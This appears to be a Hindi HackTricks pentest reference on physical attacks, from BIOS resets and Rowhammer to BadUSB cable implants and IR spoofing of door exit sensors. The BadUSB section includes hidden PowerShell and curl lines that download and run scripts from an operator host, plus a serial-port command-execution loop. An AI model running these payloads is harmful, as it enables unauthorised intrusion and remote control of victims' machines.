# भौतिक हमले

{{#include ../banners/hacktricks-training.md}}

## BIOS पासवर्ड रिकवरी और सिस्टम सुरक्षा

पुराने PC firmware की सेटिंग्स को CMOS battery डिस्कनेक्ट करके या दस्तावेज़ीकृत clear-CMOS jumper का उपयोग करके रीसेट किया जा सकता है। बिजली बंद रखने का आवश्यक समय बोर्ड पर निर्भर करता है। आधुनिक UEFI पासवर्ड या keys nonvolatile flash, embedded controller या security device में हो सकती हैं, इसलिए battery हटाने के बाद भी बनी रह सकती हैं। Pins को short करने से पहले board/service manual देखें; इस प्रक्रिया से TPM measurements अमान्य हो सकते हैं और disk-encryption recovery शुरू हो सकती है।

पुराने x86 सिस्टम पर, **killCMOS** और **CmosPwd** जैसे tools bootable environment से CMOS-backed settings की जाँच या उनमें बदलाव कर सकते हैं। CmosPwd पुराने BIOS families के दस्तावेज़ीकृत सेट के password formats पहचानता है और CMOS state का backup, restore या erase/kill कर सकता है; इसके प्रकाशित builds पुराने DOS/Windows, Linux, FreeBSD और NetBSD environments को target करते हैं।<sup>[[18]](#references)</sup> ये utilities सामान्य UEFI password removers नहीं हैं और इनके लिए पर्याप्त hardware/firmware access आवश्यक है।

कुछ laptop firmware में कई असफल password attempts के बाद vendor-specific challenge code दिखता है। [bios-pw.org](https://bios-pw.org) जैसे databases कुछ models के लिए पुराने vendor recovery passwords निकाल सकते हैं, लेकिन कई सिस्टम ऐसा lockout लागू करते हैं जिसमें challenge से password नहीं निकाला जा सकता। जनरेट किए गए किसी भी password को model-specific मानें और स्थायी attempt counters को समाप्त करने से बचें।

### UEFI सुरक्षा

आधुनिक **UEFI** सिस्टम के लिए, CHIPSEC Secure Boot variable protections का audit कर सकता है। नीचे दिए गए non-modifying check से शुरू करें; वैकल्पिक `-a modify` mode जानबूझकर variables को corrupt करने का प्रयास करता है और इसका उपयोग केवल ऐसे lab system पर करें जिसे recover किया जा सके। CHIPSEC स्वयं चेतावनी देता है कि इसका privileged driver और low-level hardware access production endpoints के लिए उपयुक्त नहीं हैं।<sup>[[11]](#references)</sup>

```bash
chipsec_main -m common.secureboot.variables
# Destructive validation on a recoverable test system only:
chipsec_main -m common.secureboot.variables -a modify
```

---

## RAM विश्लेषण और Cold Boot हमले

Refresh रुकने पर DRAM तुरंत हर bit नहीं खोता। डेटा क्षय की दर module technology और तापमान के अनुसार काफी बदलती है; ठंडा करने से उपयोगी डेटा, बिना ठंडा किए power cycle करने की तुलना में कहीं अधिक समय तक सुरक्षित रह सकता है। Cold-boot हमला तेजी से reboot करके एक छोटे acquisition environment में जाता है या ठंडा किया हुआ module स्थानांतरित करता है, raw memory capture करता है और bit decay के बावजूद cryptographic keys को पुनर्निर्मित करता है। Disk-copy utility अपने-आप physical-memory imager नहीं होती, और Volatility capture का विश्लेषण करता है, उसे acquire नहीं करता; platform के अनुकूल, validated acquisition tool का उपयोग करें।<sup>[[12]](#references)</sup>

---

## Page Tables के विरुद्ध GPU Rowhammer

आधुनिक GPU Rowhammer हमले तब कहीं अधिक उपयोगी हो जाते हैं, जब वे सामान्य buffers के बजाय **GPU virtual-memory metadata** को निशाना बनाते हैं। **GDDR6 NVIDIA Ampere GPUs** पर हालिया शोध दिखाता है कि unprivileged CUDA code चलाने वाला attacker, GPU-विशिष्ट hammering patterns बना सकता है, vulnerable rows में paging structures रखने के लिए **memory massaging** का उपयोग कर सकता है, और फिर **last-level page table** या मध्यवर्ती **page directory** में bits flip कर सकता है। एक translation entry दूषित होते ही attacker **arbitrary GPU memory read/write** हासिल कर सकता है और फिर host compromise तक पहुंच सकता है।<sup>[[1]](#references)[[2]](#references)</sup>

### Exploitation Pattern

1. GDDR6 में **hammerable rows की प्रोफाइलिंग** करें और in-DRAM mitigations को bypass करने वाले refresh-aware / non-uniform hammering patterns बनाएं।
2. **GPU allocations को massage** करें, ताकि driver page-translation structures को default protected pool में रखने के बजाय hammerable physical locations में रखे। व्यवहार में, इसका अर्थ low-memory page-table region को भर देना और नियंत्रित strides के साथ बड़े sparse UVM mappings फैलाना हो सकता है।
3. Page-table / page-directory entry के अंदर **PFN** या aperture-संबंधी bits जैसे **translation metadata को flip** करें, ताकि attacker-नियंत्रित virtual page, page-table pages, arbitrary GPU memory या host-visible system mappings पर resolve हो।
4. Forged mapping का फिर से उपयोग करके अन्य translation entries rewrite करें और GPU contexts में **arbitrary GPU memory read/write** तक privilege बढ़ाएं।

### Host Pivot और Mitigations

- **IOMMU disabled** होने पर forged system-aperture mappings GPU को मनमानी **host physical memory** दिखा सकती हैं, जिससे GPU primitive पूर्ण host compromise में बदल जाता है।<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
- **GDDRHammer** last-level page-table entries को निशाना बनाता है, जबकि **GeForge** दिखाता है कि page-directory level को दूषित करना आसान हो सकता है, क्योंकि एक bit flip बड़े translation subtree को retarget कर सकता है। केवल एक paging layer को security-critical न मानें।<sup>[[1]](#references)[[2]](#references)</sup>
- **IOMMU** अब भी महत्वपूर्ण है, क्योंकि यह GDDRHammer/GeForge द्वारा उपयोग किए जाने वाले सीधे arbitrary-host-memory रास्ते को रोकता है, लेकिन यह **पूर्ण mitigation नहीं है**। **GPUBreach** दूसरे चरण का pivot दिखाता है, जिसमें attacker GPU-writable, driver-owned CPU buffers को दूषित करता है और फिर NVIDIA driver memory-safety bugs trigger करके kernel write primitive तथा **root shell** हासिल करता है, भले ही IOMMU enabled हो।<sup>[[3]](#references)</sup>
- समर्थित workstation/server GPUs पर **System-level ECC** एक व्यावहारिक hardening कदम है। ECC के बिना consumer GPUs में सुरक्षा की कमजोरियां अधिक हैं।<sup>[[4]](#references)</sup>
- ये हमले केवल सैद्धांतिक नहीं हैं: **GeForge** ने RTX 3060 पर **1,171** और RTX A6000 पर **202** bit flips रिपोर्ट किए, जो host-privilege-escalation की एक काम करने वाली chain बनाने के लिए पर्याप्त थे।<sup>[[2]](#references)[[9]](#references)</sup>

---

## Direct Memory Access (DMA) हमले

ऐसी offline UEFI IFR/NVRAM patching के लिए, जो pre-boot IOMMU enforcement को downgrade करके Windows DMA chain सक्षम कर सकती है, देखें:

{{#ref}}
firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

**Inception**, FireWire और शुरुआती Thunderbolt configurations जैसे interfaces पर **DMA-आधारित memory acquisition और patching** दिखाता है; इसमें ऐतिहासिक login-bypass signatures भी शामिल हैं। यह बस “Windows 10 पर अप्रभावी” नहीं है: exploitability interface, target build, IOMMU policy, lock state और Windows Kernel DMA Protection के समर्थित तथा enabled होने पर निर्भर करती है। Windows 10 version 1803 और उसके बाद के संस्करणों ने compatible platforms पर Kernel DMA Protection प्रस्तुत किया, जिससे attack surface में बड़ा बदलाव आया।<sup>[[13]](#references)[[14]](#references)</sup>

---

## System Access के लिए Live CD/USB

Unencrypted या पहले से unlocked Windows volume पर, offline environment **sethc.exe** या **Utilman.exe** जैसी accessibility binaries को **cmd.exe** से बदल सकता है। इससे संबंधित logon-screen shortcut चलाने पर SYSTEM command prompt मिलता है। **chntpw** जैसे tools स्थानीय SAM account data edit कर सकते हैं। ये तरीके locked BitLocker volume को bypass नहीं करते और DPAPI/EFS से सुरक्षित credentials को नुकसान पहुंचा सकते हैं; forensic copies और backups सुरक्षित रखें।

**Kon-Boot**, समर्थित Windows/macOS configurations के लिए boot-time authentication-bypass का एक commercial tool है। इसकी compatibility OS, firmware mode, Secure Boot और disk-encryption setup पर निर्भर करती है; यह BitLocker-locked volume को decrypt नहीं करता।<sup>[[10]](#references)</sup>

---

## Windows Security Features को संभालना

### Boot और Recovery Shortcuts

- **Delete/Supr**, F2, F10 या कोई अन्य vendor key firmware setup खोल सकती है।
- **F8** केवल उन configurations में legacy Windows advanced boot options खोलता है जहां यह रास्ता अब भी enabled है; मौजूदा recovery विकल्प अलग-अलग हो सकते हैं।
- **Shift** दबाए रखने से कुछ configurations में Windows automatic logon रोका जा सकता है, हालांकि policy/registry settings इस व्यवहार को disable कर सकती हैं।<sup>[[17]](#references)</sup>

### BAD USB Devices

**USB Rubber Ducky** और Teensy boards जैसे devices trusted HID keyboards के रूप में enumerate होकर पहले से तय keystrokes inject कर सकते हैं। Payload को शुरुआत में logged-on session के privileges और desktop access मिलते हैं; UAC prompts, screen locking, keyboard layout, timing और endpoint USB policy फिर भी उसे सीमित करते हैं।<sup>[[15]](#references)</sup>

### Volume Shadow Copy

Administrator या backup privileges से shadow copy बनाई जा सकती है या registry hives save किए जा सकते हैं, ताकि **SAM** और **SYSTEM** जैसी locked files acquire की जा सकें। यह post-compromise collection technique है, privilege bypass नहीं, और इसे `diskshadow`/VSS तथा registry-hive export events के साथ correlate करना चाहिए।

## BadUSB / HID Implant Techniques

### NFC-triggered Android HID gadget

Rooted Android phone programmable USB keyboard तभी बन सकता है, जब उसके USB controller और kernel में **USB gadget/HID support** हो। Compatible devices पर Kali NetHunter, **USB Arsenal** के ज़रिए gadget profiles उपलब्ध कराता है। एक अन्य विकल्प [USB Gadget Tool](https://github.com/tejado/android-usb-gadget) है, जो ConfigFS gadget functions बनाता है और `/dev/hidg0` तथा `/dev/hidg1` जैसे keyboard/mouse character devices उपलब्ध करा सकता है। यह tool केवल gadget endpoint बनाता है; HID reports उस पर लिखने के लिए अलग process चाहिए। Root access ऐसे kernel की भरपाई नहीं कर सकता जिसमें ConfigFS, HID gadget support या उपयोगी USB Device Controller न हो।<sup>[[19]](#references)[[20]](#references)[[21]](#references)</sup>

इस endpoint को Android NFC के साथ physical trigger के रूप में जोड़ा जा सकता है। [NFC-to-HID](https://github.com/androidmalware/NFC-to-HID) app tag UID पढ़ता है, उसे अपने अपेक्षित representation में बदलता है, local whitelist से जांचता है और match मिलने पर configured Rubber Ducky-शैली का keyboard sequence भेजता है। Connected host को सामान्य keyboard input दिखाई देता है और उसे NFC software की जरूरत नहीं होती।<sup>[[22]](#references)[[24]](#references)</sup>

Shortcuts या commands इस्तेमाल करने से पहले, किसी खाली text editor में enumeration और keyboard layout जांचें। एक harmless payload यह है:<sup>[[24]](#references)</sup>

```text
DELAY 1000
STRING NFC HID test successful
ENTER
```

महत्वपूर्ण trust boundaries:<sup>[[22]](#references)[[23]](#references)[[24]](#references)</sup>

- **UID whitelist पहचान है, authentication नहीं**। UID सार्वजनिक होते हैं और कुछ token प्रकार या emulators की cloning या impersonation संभव है। कॉपी किया गया allowed UID, original token वाले ही dispatch path पर चलता है।
- **NfcScreenOff** Magisk module, NFC service को इस तरह patch करता है कि वह मानता है कि screen चालू और unlocked है। अगर phone पहले से किसी host से जुड़ा है, तो इससे कोई व्यक्ति phone unlock किए बिना payload trigger कर सकता है।
- Payload में रखे passwords, API tokens और commands, rooted या bootloader-unlocked device पर ऐसे secrets हैं जिन्हें वापस प्राप्त किया जा सकता है। HID के ज़रिए password टाइप करना, passwordless authentication नहीं, बल्कि reusable-password automation है।
- HID injection, active desktop के privileges के साथ काम करता है और focus, timing तथा host keyboard layout पर निर्भर करता है। Sensitive actions dispatch करने से पहले हाल की user confirmation ज़रूरी रखें, scripts में privileged secrets रखने से बचें, और वास्तविक authentication के लिए cryptographic challenge-response authenticator का उपयोग करें।

### Wi-Fi managed cable implants

- **Evil Crow Cable Wind** जैसे ESP32-S3 आधारित implants, USB-A→USB-C या USB-C↔USB-C cables के अंदर छिपे होते हैं, केवल USB keyboard के रूप में enumerate होते हैं और अपना C2 stack Wi-Fi पर उपलब्ध कराते हैं। Operator को बस victim host से cable को power देना होता है, `Evil Crow Cable Wind` नाम और `123456789` password वाला hotspot बनाना होता है, और embedded HTTP interface तक पहुँचने के लिए [http://cable-wind.local/](http://cable-wind.local/) (या उसके DHCP address) पर जाना होता है।<sup>[[8]](#references)</sup>
- Browser UI में *Payload Editor*, *Upload Payload*, *List Payloads*, *AutoExec*, *Remote Shell* और *Config* के tabs होते हैं। Stored payloads को OS के अनुसार tag किया जाता है, keyboard layouts तुरंत बदले जा सकते हैं, और VID/PID strings को बदलकर ज्ञात peripherals जैसा दिखाया जा सकता है।
- चूँकि C2 cable के अंदर होता है, phone का उपयोग payloads तैयार करने, execution trigger करने और Wi-Fi credentials प्रबंधित करने के लिए किया जा सकता है—इसके लिए organization के network की ज़रूरत नहीं होती। यह कम dwell-time वाली physical intrusions के लिए उपयोगी है।

### OS-aware AutoExec payloads

- AutoExec rules, USB enumeration के तुरंत बाद चलाने के लिए एक या अधिक payloads को bind करते हैं। Implant हल्की OS fingerprinting करता है और matching script चुनता है।
- उदाहरण workflow:
  - *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`।
  - *macOS/Linux:* `COMMAND SPACE` (Spotlight) या `CTRL ALT T` (terminal) → `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`।
- चूँकि execution unattended होता है, charging cable को बस बदल देने से logged-on user context में “plug-and-pwn” initial access मिल सकता है।

### Wi-Fi TCP पर HID-bootstrapped remote shell

1. **Keystroke bootstrap:** Stored payload एक console खोलता है और ऐसा loop paste करता है जो नए USB serial device से आने वाली हर चीज़ execute करता है। Windows का एक minimal variant है:

```powershell
$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
$port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
```

2. **Cable bridge:** इम्प्लांट USB CDC चैनल खुला रखता है, जबकि उसका ESP32-S3 ऑपरेटर से वापस कनेक्ट होने के लिए TCP client (Python script, Android APK या desktop executable) लॉन्च करता है। TCP session में टाइप किए गए सभी bytes ऊपर दिए गए serial loop में फ़ॉरवर्ड किए जाते हैं, जिससे air-gapped hosts पर भी remote command execution संभव होता है। Output सीमित होता है, इसलिए ऑपरेटर आमतौर पर blind commands (account creation, अतिरिक्त tooling को staging करना आदि) चलाते हैं।

### HTTP OTA update surface

- Evil Crow Cable Wind का documented interface `/update` पर बिना authentication वाला firmware-update endpoint उपलब्ध कराता है:<sup>[[8]](#references)</sup>

```bash
curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
```

- Field operators engagement के बीच में features को hot-swap कर सकते हैं (जैसे, USB Army Knife firmware flash करना), बिना cable खोले। इससे implant target host में plugged रहते हुए नई capabilities पर pivot कर सकता है।

## BitLocker Encryption को Bypass करना

किसी live या हाल ही में चलाए गए system का अधिकृत forensic acquisition, volume के unlocked रहने के दौरान, उसमें BitLocker volume master key या उससे संबंधित key material समेट सकता है। Elcomsoft Forensic Disk Decryptor और Passware Kit Forensic जैसे commercial tools समर्थित memory images, hibernation files या crash dumps में खोज कर सकते हैं, लेकिन सफलता की गारंटी नहीं है। BitLocker enabled होने पर आधुनिक Windows crash dumps को भी encrypt करता है, और stored 48-digit recovery password, in-memory volume key से अलग artifact है।<sup>[[12]](#references)[[16]](#references)</sup>

---

## Recovery Key जोड़ने के लिए Social Engineering

जो attacker किसी administrator को BitLocker-management commands चलाने के लिए मना लेता है, वह recovery-password, external-key या कोई अन्य protector जोड़कर उसे capture कर सकता है। Recovery password मनमाने ढंग से चुने गए शून्यों की string नहीं हो सकता: BitLocker numerical recovery passwords का format मान्य 48-digit format होता है। अधिकृत administration के लिए संबंधित syntax है `manage-bde -protectors -add C: -recoverypassword`; जोड़े गए protectors की सूची देखने के लिए `manage-bde -protectors -get C:` चलाएँ। Protector जोड़ने की घटनाओं पर नज़र रखें और सुनिश्चित करें कि नया recovery material केवल अनुमोदित स्थानों पर escrow किया जाए।<sup>[[16]](#references)</sup>

---

## BIOS को Factory-Reset करने के लिए Chassis Intrusion / Maintenance Switches का Exploitation

कई आधुनिक laptops और small-form-factor desktops में **chassis-intrusion switch** होता है, जिसे Embedded Controller (EC) और BIOS/UEFI firmware monitor करते हैं। Switch का मुख्य उद्देश्य device खोले जाने पर alert देना है, लेकिन कभी-कभी vendors एक **undocumented recovery shortcut** लागू करते हैं, जो switch को एक खास pattern में toggle करने पर trigger होता है।<sup>[[5]](#references)[[6]](#references)</sup>

### Attack कैसे काम करता है

1. Switch, EC के **GPIO interrupt** से wired होता है।
2. EC पर चल रहा firmware **presses की timing और संख्या** का हिसाब रखता है।
3. जब एक hard-coded pattern पहचाना जाता है, तो EC एक *mainboard-reset* routine चलाता है, जो **system NVRAM/CMOS की contents मिटा देता है**।
4. अगले boot पर प्रभावित models firmware state को reset करके load करते हैं। Vendor और revision के आधार पर, cleared state में supervisor password, custom boot settings या enrolled Secure Boot keys शामिल हो सकते हैं; TPM state और disk-encryption पर होने वाले प्रभावों का अलग से आकलन करना चाहिए।

> Firmware reset से external-boot options वापस मिल सकते हैं, लेकिन इससे storage decrypt **नहीं** होती। TPM/firmware में बदलाव के बाद BitLocker या कोई अन्य full-disk encryption system recovery mode में जा सकता है, फिर भी recovery key के बिना internal drive को सुरक्षित रखता है।<sup>[[16]](#references)</sup>

### वास्तविक उदाहरण – Framework 13 Laptop

Framework 13 (11th/12th/13th-gen) के लिए recovery shortcut यह है:

```text
Press intrusion switch  →  hold 2 s
Release                 →  wait 2 s
(repeat the press/release cycle 10× while the machine is powered)
```

दसवें चक्र के बाद EC एक फ़्लैग सेट करता है, जो BIOS को अगले रीबूट पर NVRAM मिटाने का निर्देश देता है। पूरी प्रक्रिया में लगभग 40 सेकंड लगते हैं और इसके लिए **सिर्फ़ एक स्क्रूड्राइवर** चाहिए।<sup>[[5]](#references)</sup>

### सामान्य Exploitation प्रक्रिया

1. लक्ष्य को चालू करें या उसे सस्पेंड से फिर शुरू करें, ताकि EC चल रहा हो।
2. नीचे का कवर हटाकर intrusion/maintenance switch तक पहुँचें।
3. विक्रेता-विशिष्ट टॉगल पैटर्न दोहराएँ (दस्तावेज़, फ़ोरम देखें या EC firmware को reverse-engineer करें)।
4. डिवाइस को फिर से जोड़ें और रीबूट करें, फिर जाँचें कि कौन-सी firmware settings और credentials वास्तव में बदले।
5. यदि अधिकृत हो और external boot उपलब्ध हो, तो एक नियंत्रित live image से बूट करें। जब किसी internal volume को वैध रूप से unlock कर दिया जाए (या वह पहले से encrypted न हो), तो live environment credentials और data प्राप्त कर सकता है या EFI System Partition की जाँच कर सकता है। EFI implant इंस्टॉल करने के लिए उस partition में बदलाव करना persistent और अत्यधिक दखल देने वाला है, और यह Secure Boot, measured boot, firmware write protection तथा endpoint monitoring की पाबंदियों के अधीन रहता है। Encrypted storage उसकी key या recovery material के बिना पहुँच से बाहर रहता है।

### पहचान और शमन

* OS management console में chassis-intrusion events लॉग करें और उनका अप्रत्याशित BIOS resets से मिलान करें।
* खोलने का पता लगाने के लिए स्क्रू/कवर पर **tamper-evident seals** लगाएँ।
* डिवाइस **भौतिक रूप से नियंत्रित जगहों** पर रखें; मानकर चलें कि physical access का अर्थ है पूर्ण compromise।
* जहाँ उपलब्ध हो, विक्रेता का “maintenance switch reset” फीचर बंद करें या NVRAM reset के लिए अतिरिक्त cryptographic authorisation आवश्यक करें।

---

## No-Touch Exit Sensors के विरुद्ध गुप्त IR Injection

### Sensor की विशेषताएँ
- सामान्य “wave-to-exit” sensors में near-IR LED emitter को TV remote जैसे receiver module के साथ जोड़ा जाता है। यह सही carrier (लगभग 30 kHz) के कई pulses (~4–10) देखने के बाद ही logic high रिपोर्ट करता है।<sup>[[7]](#references)</sup>
- एक plastic shroud emitter और receiver को सीधे एक-दूसरे की ओर देखने से रोकता है, इसलिए controller मानता है कि validate किया गया carrier पास की किसी सतह से परावर्तित होकर आया है, और door strike खोलने वाला relay सक्रिय करता है।
- Controller को लक्ष्य मौजूद होने का पता चलने के बाद अक्सर outbound modulation envelope बदल जाता है, लेकिन receiver filtered carrier से मेल खाने वाले किसी भी burst को स्वीकार करता रहता है।

### Attack का कार्यप्रवाह
1. **Emission profile कैप्चर करें** – controller pins पर logic analyser लगाकर pre-detection और post-detection, दोनों waveforms रिकॉर्ड करें, जो internal IR LED को चलाते हैं।
2. **सिर्फ़ “post-detection” waveform दोबारा चलाएँ** – stock emitter हटाएँ/अनदेखा करें और शुरुआत से ही पहले से trigger किए गए pattern से external IR LED चलाएँ। चूँकि receiver को सिर्फ़ pulse count/frequency से मतलब है, वह spoofed carrier को असली reflection मानकर relay line सक्रिय कर देता है।
3. **Transmission को नियंत्रित करें** – receiver के AGC या interference handling logic को saturate किए बिना न्यूनतम pulse count देने के लिए carrier को तय bursts (जैसे, दसियों milliseconds चालू और लगभग उतने ही बंद) में प्रसारित करें। लगातार emission से sensor जल्दी desensitise हो जाता है और relay सक्रिय होना बंद हो जाता है।

### लंबी दूरी से Reflective Injection
- bench LED की जगह high-power IR diode, MOSFET driver और focusing optics लगाने से लगभग 6 m दूर से भरोसेमंद triggering संभव है।
- हमलावर को receiver aperture की सीधी दृष्टि-रेखा की ज़रूरत नहीं होती; काँच के पार दिखाई देने वाली अंदरूनी दीवारों, शेल्फ़ों या door frames पर beam डालने से परावर्तित ऊर्जा ~30° field of view में प्रवेश कर सकती है और पास से हाथ हिलाने जैसी लगती है।
- चूँकि receivers कमज़ोर reflections की अपेक्षा करते हैं, इसलिए ज़्यादा शक्तिशाली external beam कई सतहों से टकराने के बाद भी detection threshold से ऊपर रह सकती है।

### हथियार के रूप में बदली गई Attack Torch
- commercial flashlight के अंदर driver लगाने से यह उपकरण सामान्य नज़र आता है। दिखने वाली LED को receiver के band से मेल खाने वाली high-power IR LED से बदलें, लगभग 30 kHz bursts बनाने के लिए ATtiny412 (या इसी तरह का MCU) जोड़ें और LED current sink करने के लिए MOSFET इस्तेमाल करें।
- telescopic zoom lens दूरी/सटीकता के लिए beam को संकरा करता है, जबकि MCU के नियंत्रण वाला vibration motor, दिखाई देने वाली रोशनी निकाले बिना, modulation सक्रिय होने की haptic पुष्टि देता है।
- अलग-अलग rebranded sensor families के साथ अनुकूलता बढ़ाने के लिए कई संग्रहीत modulation patterns (carrier frequencies और envelopes में थोड़े अंतर के साथ) बारी-बारी से चलाएँ। इससे operator परावर्तक सतहों पर तब तक beam डाल सकता है, जब तक relay के क्लिक की आवाज़ न सुनाई दे और दरवाज़ा न खुल जाए।

---

## References

- [1] [GDDRHammer: DRAM Rows को बड़े पैमाने पर बाधित करना — आधुनिक GPUs से Cross-Component Rowhammer Attacks](https://gddr.fail/files/gddrhammer.pdf)
- [2] [GeForge: मज़े और फ़ायदे के लिए GPU Page Tables बनाने हेतु GDDR Memory पर Hammering](https://stefan1wan.github.io/files/GeForge.pdf)
- [3] [GPUBreach: Rowhammer का इस्तेमाल करके GPUs पर Privilege Escalation Attacks](https://gururaj-s.github.io/assets/pdf/SP26_GPUBreach.pdf)
- [4] [NVIDIA - Security Notice: Rowhammer - जुलाई 2025](https://nvidia.custhelp.com/app/answers/detail/a_id/5671/~/security-notice%3A-rowhammer---july-2025)
- [5] [Pentest Partners – “Framework 13. यहाँ दबाएँ और pwn करें”](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
- [6] [FrameWiki – Mainboard Reset Guide](https://framewiki.net/guides/mainboard-reset)
- [7] [SensePost – “Noooooooo Touch! – गुप्त IR Torch से IR No-Touch Exit Sensors को बायपास करना”](https://sensepost.com/blog/2025/noooooooooo-touch/)
- [8] [Mobile-Hacker – “Plug, Play, Pwn: Evil Crow Cable Wind से Hacking”](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)
- [9] [Bruce Schneier - NVIDIA Chips के विरुद्ध Rowhammer Attack](https://www.schneier.com/blog/archives/2026/05/rowhammer-attack-against-nvidia-chips.html)
- [10] [Kon-Boot के आधिकारिक दस्तावेज़ और compatibility जानकारी](https://kon-boot.com/)
- [11] [CHIPSEC documentation - Secure Boot variable protections](https://chipsec.github.io/modules/chipsec.modules.common.secureboot.variables.html)
- [12] [यदि हम याद न रखें: Encryption Keys पर Cold Boot Attacks](https://www.usenix.org/legacy/events/sec08/tech/full_papers/halderman/halderman.pdf)
- [13] [Inception - DMA के ज़रिए physical memory में हेरफेर](https://github.com/carmaa/inception)
- [14] [Microsoft Learn - Kernel DMA Protection](https://learn.microsoft.com/en-us/windows/security/hardware-security/kernel-dma-protection-for-thunderbolt)
- [15] [Hak5 USB Rubber Ducky documentation](https://docs.hak5.org/hak5-usb-rubber-ducky/)
- [16] [Microsoft Learn - BitLocker operations guide](https://learn.microsoft.com/en-us/windows/security/operating-system-security/data-protection/bitlocker/operations-guide)
- [17] [Microsoft Learn - Shift दबाए रखने और automatic logon के व्यवहार पर जानकारी](https://learn.microsoft.com/en-us/troubleshoot/windows-client/user-profiles-and-logon/hold-shift-key-shutting-down-not-disable-automatic-logon)
- [18] [CGSecurity - CmosPwd documentation and downloads](https://www.cgsecurity.org/wiki/CmosPwd)
- [19] [Kali Linux Documentation - NetHunter USB-Arsenal](https://www.kali.org/docs/nethunter/nethunter-usbarsenal/)
- [20] [Linux kernel documentation - USB HID gadget driver](https://docs.kernel.org/usb/gadget_hid.html)
- [21] [USB Gadget Tool](https://github.com/tejado/android-usb-gadget)
- [22] [NFC-to-HID](https://github.com/androidmalware/NFC-to-HID)
- [23] [NfcScreenOff](https://github.com/Jon8RFC/NfcScreenOff)
- [24] [Rooted Android Phone को अपने PC के लिए NFC Authenticator और Automation Tool में बदलें](https://mobile-hacker.com/2026/09/21/turn-a-rooted-android-phone-into-an-nfc-authenticator-and-automation-tool-for-your-pc/)
{{#include ../banners/hacktricks-training.md}}
